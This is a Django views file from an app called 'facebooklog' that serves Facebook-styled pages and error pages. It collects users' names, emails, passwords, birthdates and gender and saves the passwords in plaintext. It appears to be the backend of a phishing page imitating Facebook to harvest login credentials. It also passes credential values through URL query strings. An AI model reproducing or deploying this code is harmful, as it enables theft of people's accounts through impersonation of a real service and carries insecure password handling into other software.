from django.shortcuts import render

# Create your views here.
from django.http import HttpResponse,Http404
from django.template import loader
from django.template import Template
from django.shortcuts import render
from .import views
from facebooklog .models import *
def home(request):
	template=loader.get_template('facebook.html')
	context={"title":"hello"}
	return HttpResponse(template.render(context, request))

def error(request):
	if request.method=='GET':
		email = request.GET['email']
		passname =  request.GET['name']
	template=loader.get_template('fberror.html')
	context={"email":email,"name":passname}
	
	return HttpResponse(template.render(context, request))
def success(request):
	if request.method=='GET':
		email = request.GET['email']
		passname =  request.GET['name']
	template=loader.get_template('facebook2.html')
	context={"email":email,"name":passname}
	
	return HttpResponse(template.render(context, request))
def error2(request):
	template=loader.get_template('fberror2.html')
	context={}
	return HttpResponse(template.render(context, request))

def insert(request):
	if request.method=="POST":
		firstname = request.POST['name1']
		lastname = request.POST['name2']
		email = request.POST['email1']
		paswd = request.POST['pass']
		day = request.POST['day']
		month = request.POST['month']
		year = request.POST['year']
		gen = request.POST['gen']
		
		obj=facebook()
		obj.name=firstname
		obj.lastname=lastname
		obj.email=email
		obj.paswd=paswd
		obj.day=day
		obj.month=month
		obj.year=year
		obj.gen=gen

		obj.save()
